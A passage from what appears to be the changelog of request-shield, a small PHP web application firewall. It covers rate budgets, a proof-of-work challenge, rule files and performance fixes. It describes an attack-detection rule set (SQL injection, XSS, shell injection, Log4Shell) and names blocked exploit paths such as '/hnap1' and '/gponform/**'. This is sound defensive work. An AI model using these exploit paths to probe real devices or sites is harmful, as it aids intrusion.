  headers, and each example's status and headers in place; it runs on a rule
  file, with a search page (its own budget), an edit form (POST only there),
  an admin area and an API restricted by address, a pass that expires after a
  minute, and the shield's log. Tested end to end, at
  the root and in a subdirectory.
- PHP 8.0 support (the Red Hat Enterprise Linux 9 baseline): no `readonly`
  properties at runtime any more — public ones are marked `@readonly`, which
  PHPStan enforces —, no string-key unpacking, `array_is_list()` and `xxh128`
  only where PHP has them. CI tests PHP 8.0 too. Cost on PHP 8.1 unchanged.
- Attack rules look inside the request: `block query|header <Name>|headers|anywhere
  <regex>`, matched on the normalised values (decoded twice, lower case, SQL
  comments out) and answered with 403 "attack"; `unblock`, `unblock at` and
  `replace` work for them. The rules are one combined expression per target,
  checked when read — a passing request without them does nothing extra. The
  rules page, `bin/request-shield show|check|trace` and `Shield::explain()`
  name them like every other rule
  ([docs](docs/features/RSF05-01-rule-files.md#attack-patterns)).
- `rules/attacks.rules` (`include @attacks`): a reviewed set against SQL
  injection, cross-site scripting, code and shell injection, file inclusion,
  Log4Shell and the known attack tools and exploit paths, after the OWASP Core
  Rule Set's first level (IDs `ATK-…`, `version 2026.09.1`).

### Fixed
- A form sent past `challenge-at` without a valid pass got "Please try again in
  10 seconds" instead of the check -- for example after the pass ran out while
  the check inside the form showed ✓ (it had been given no answer, since the
  visitor held a pass then). Such a form now gets the check page, which sends
  it again once solved, as `requirePass()` and a spent budget's check already
  did. The widget endpoint also says until when the pass holds (`until`); the
  box fetches a task before it runs out, and a pass with less than 30 seconds
  left gets one anyway.
- A form the check page sent again after solving was refused its answer (the
  answer comes in a cookie, which a POST was allowed only for `requirePass()`
  and a spent budget), got the check page again and, on the third try, "The
  check did not succeed". The check page's own resent form counts now. And
  `requirePass()` carried a used answer of the check inside the form (a
  reload of the page the form was sent to sends it again) into the resent
  form, where it won over the new one -- the same loop. It is taken out first
  now.
- Fake search engine crawlers could make requests wait where DNS does not
  answer (a DMZ): each new address claiming to be Googlebot started a DNS
  lookup that waited for the resolver's timeout. At most `dns-lookups` new
  lookups a minute are made now, for all requests together (default 30); past
  that a claimed crawler counts as not verified at once, and nothing is
  remembered. `set dns-lookups 0` for no lookups at all. The check itself never
  needed the internet (documented).
- The check page said "The check did not succeed" on the fourth check in a
  browser tab, however far apart and on whatever pages: its guard against a
  loop counted every check page of the tab and was never reset. It now counts
  only attempts at the same address within a minute.
- The check inside the form sent an answer that had been used or had expired
  -- after the back button, or a form filled in for minutes -- which then got
  the check page. It now starts again when the page comes back from the
  browser's cache, and fetches a new answer when the one it has is about to
  expire.
- `unblock regex <expression>` and `unblock … at <paths>` did not find a
  content rule: its pattern is kept case-insensitive and the lookup missed it.
- `rules/attacks.rules` blocked `/hnap1` and `/gponform/**` never: the paths
  were written with capital letters while the path is matched lower-cased.
- `block query @scanners` (or an `[ID]`) silently became a pattern matching its
  own name; it is an error now.
- `trace` and the rules page's check had no step for the attack rules: a
  refused request looked unblocked there.
- The file store could lose a count on the very first hits of a new
  directory: processes creating it at the same moment made a recursive
  `mkdir()` fail in one of them. It now tries again (reproduced: 1 of 240 runs
  of 8 processes lost one hit; after the fix 0 of 360).

### Changed
- Faster: the blocked paths are matched as one expression (compiled once), so
  a clean request costs one match however many blocks there are (7.7 instead of
  8.2 µs per request with the defaults); attack rules skip a target when its
  raw value cannot hold what every one of its patterns starts with (Log4Shell:
  `${`), and white space is only normalised where there is any. With
  `include @attacks` a clean request costs about 8.6 µs more instead of 10.5
  (PHP 8.1, measured end to end).
- The end-to-end tests take their ports from the operating system: a guessed
  port could belong to another service, which then answered the test.
- The compiled settings record every source file and the environment
  variables used (format 4: rebuilt once after the update); `Settings` has the
  log, the access rules and the rules' origins. `Shield::consume()` takes the
  request from `protect()` when none is given.
- The README opens with what the shield does for a website, in plain words (a
  mini web application firewall); the package description and keywords follow.
- Composer and release archives contain only what runs on a server (`src/`,
  `bootstrap.php`, `config/`, license and readme); tests, benchmarks, docs and
  tool settings stay in the repository (`.gitattributes`).

## [0.2.0] — 2026-09-28

### Added
- The browser challenge: an ALTCHA-compatible proof of work for clients past a
  budget's `challengeAt`, a signed pass cookie bound to client and User-Agent,
  single-use solutions, difficulty growing towards the limit, verified search
  engine crawlers and exempt paths never challenged
  ([docs](docs/features/RSF03-02-browser-challenge.md)).
- `Shield::protectFile()`: settings checked once and compiled into a PHP file
  OPcache serves, rebuilt when the file changes; `bootstrap.php` uses it
  ([docs](docs/features/RSF05-02-settings.md)).
- Typed settings: a wrong type is an error naming the key.
- Documentation: features, use cases, proposals, architecture decisions.
- Tests report skipped cases; the challenge page's script is tested in Node.
- CI on GitHub: tests on PHP 8.1–8.5 with and without APCu (a skipped test
  fails the APCu jobs), a smoke benchmark, PHPStan (level max), Psalm taint
  analysis uploaded to code scanning, `composer validate`/`audit`, Dependabot.
- `SECURITY.md`, `CONTRIBUTING.md`, `AGENTS.md`.

### Fixed
- A settings file rewritten within the same second was compiled with its old
  contents (OPcache judged it by the unchanged mtime) and kept them; it is now
  invalidated in OPcache before it is read again. Found by CI, which runs the
  tests with OPcache on.

### Changed
- `Request` reads headers lazily from `$_SERVER` (about 40 % less time per
  request).

## [0.1.0] — 2026-09-28

### Added
- The core: trusted proxies and client identity (IPv6 /64), hard rejects
  (methods, sizes, path sanity, hosts, scanner paths), the cacheable
  definition, per-client budgets with 429, on-demand budgets via
  `Shield::consume()`, APCu, file and memory stores, `bootstrap.php` for
  `auto_prepend_file`.

[Unreleased]: https://github.com/cjw-network/request-shield/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/cjw-network/request-shield/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/cjw-network/request-shield/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/cjw-network/request-shield/releases/tag/v0.1.0
